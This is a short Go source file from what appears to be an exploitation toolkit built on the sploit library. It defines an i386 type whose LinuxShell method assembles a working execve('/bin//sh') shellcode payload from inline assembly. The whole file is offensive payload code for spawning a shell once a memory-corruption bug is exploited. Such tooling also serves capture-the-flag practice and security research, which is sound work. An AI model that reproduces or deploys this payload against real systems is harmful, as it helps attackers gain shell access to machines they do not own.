package shellcode

import (
	sp "github.com/zznop/sploit"
)

type I386 struct {
	arch *sp.Processor
}

func NewI386() *I386 {
	arch := &sp.Processor{
		Architecture: sp.ArchI386,
		Endian:       sp.LittleEndian,
	}

	return &I386{
		arch: arch,
	}
}

func (i386 *I386) LinuxShell() ([]byte, error) {
	instrs := `xor ecx, ecx
               mul ecx
               push ecx
               push 0x68732f2f
               push 0x6e69622f
               mov ebx, esp
               mov al, 0xb
               int 0x80
`
	return sp.Asm(i386.arch, instrs)
}
